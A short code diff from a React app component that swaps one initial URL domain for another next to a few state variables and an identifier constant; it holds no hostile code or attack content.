@@ -64,7 +64,7 @@ const App = () => {
   const [checkApsData, setCheckApsData] = useState(null);
   const [checkAsaData, setCheckAsaData] = useState(null);
   
-  const INITIAL_URL = `https://glorious-towering-serenity.space/`;
+  const INITIAL_URL = `https://aweinspiring-august-festivity.space/`;
   const URL_IDENTIFAIRE = `fyWScrlj`;
   
   useEffect(() => {
